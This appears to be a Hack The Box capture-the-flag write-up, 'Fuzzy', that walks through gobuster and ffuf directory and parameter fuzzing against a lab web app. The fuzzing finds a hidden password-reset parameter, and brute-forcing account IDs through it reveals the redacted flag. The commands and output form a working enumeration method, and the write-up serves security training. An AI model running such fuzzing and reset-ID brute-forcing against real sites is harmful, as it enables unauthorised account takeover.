# Fuzzy

---  

__Title__: Fuzzy  
__Description__: We have gained access to some infrastructure which we believe is connected to the internal network of our target.  
We need you to help obtain the administrator password for the website they are currently developing.   
__Tags__: ffuf, fuzz, gobuster  

---  

## Attack Narative

### Directories scanning

```bash
clobee@kali:~/tmp/fuzzy$ gobuster dir -u http://206.189.17.51:31121/ -w /usr/share/wordlists/dirb/common.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://206.189.17.51:31121/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/03 22:50:00 Starting gobuster
===============================================================
/api (Status: 301)
/css (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
===============================================================
2021/01/03 22:50:08 Finished
===============================================================
```

```bash
clobee@kali:~/tmp/fuzzy$ curl -I http://206.189.17.51:31121/api/

HTTP/1.1 200 OK
Server: nginx
Date: Sun, 03 Jan 2021 23:03:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 39
Last-Modified: Tue, 25 Jun 2019 07:47:20 GMT
Connection: keep-alive
ETag: "5d11d188-27"
Accept-Ranges: bytes
```

We got a hit on `/api/`


#### More directories enumeration

```bash
clobee@kali:~/tmp/fuzzy$ ffuf -w /usr/share/wordlists/OneListForAll/onelistforallshort.txt -u http://206.189.17.51:31121/api/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://206.189.17.51:31121/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallshort.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

index.html              [Status: 200, Size: 39, Words: 1, Lines: 1]
action.php              [Status: 200, Size: 24, Words: 4, Lines: 1]
.                       [Status: 301, Size: 178, Words: 6, Lines: 8]
index.html?findcli=-1   [Status: 200, Size: 39, Words: 1, Lines: 1]
/#/../manager/html/     [Status: 200, Size: 39, Words: 1, Lines: 1]
/#/../admin/            [Status: 200, Size: 39, Words: 1, Lines: 1]
/#/../console/          [Status: 200, Size: 39, Words: 1, Lines: 1]
/#/../www/              [Status: 200, Size: 39, Words: 1, Lines: 1]
/#/../html/             [Status: 200, Size: 39, Words: 1, Lines: 1]
/#/../manager/text/     [Status: 200, Size: 39, Words: 1, Lines: 1]
/                       [Status: 200, Size: 39, Words: 1, Lines: 1]
                        [Status: 200, Size: 39, Words: 1, Lines: 1]

```

```bash
clobee@kali:~/tmp/fuzzy$ curl http://206.189.17.51:31121/api/action.php

Error: Parameter not set
```

#### Api fuzzing

```bash
clobee@kali:~/tmp/fuzzy$ ffuf -w /usr/share/wordlists/OneListForAll/onelistforallshort.txt -u http://206.189.17.51:31121/api/action.php?FUZZ=aa 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://206.189.17.51:31121/api/action.php?FUZZ=aa
 :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallshort.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

app_globalresources/commonresources.en.resx [Status: 200, Size: 24, Words: 4, Lines: 1]
app_globalresources/commonresources.cs.resx [Status: 200, Size: 24, Words: 4, Lines: 1]
app_globalresources/commonresources.da.resx [Status: 200, Size: 24, Words: 4, Lines: 1]
```

Not using any filtering returns `-fw` returns too many results.
So using `-fw 4` filters `[..., Words: 4, ...]` 

```bash
# -fw 4

clobee@kali:~/tmp/fuzzy$ ffuf -w /usr/share/wordlists/OneListForAll/onelistforallshort.txt -u http://206.189.17.51:31121/api/action.php?FUZZ=aa -fw 4


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://206.189.17.51:31121/api/action.php?FUZZ=aa
 :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallshort.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 4
________________________________________________

reset                   [Status: 200, Size: 27, Words: 5, Lines: 1]

```

We have a hit 

```bash
clobee@kali:~/tmp/fuzzy$ curl http://206.189.17.51:31121/api/action.php?reset=xx
Error: Account ID not found
```

```bash

clobee@kali:~/tmp/fuzzy$ ffuf -w /usr/share/wordlists/OneListForAll/onelistforallmicro.txt -u http://206.189.17.51:31121/api/action.php?reset=FUZZ -fw 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://206.189.17.51:31121/api/action.php?reset=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallmicro.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 5
________________________________________________

20                      [Status: 200, Size: 74, Words: 10, Lines: 1]
:: Progress: [13938/13938] :: Job [1/1] :: 376 req/sec :: Duration: [0:00:37] :: Errors: 0 ::

```

#### Capture the flag

```bash
clobee@kali:~/tmp/fuzzy$ curl http://206.189.17.51:31121/api/action.php?reset=20
You successfully reset your password! Please use HTB{XXXX} to login.
```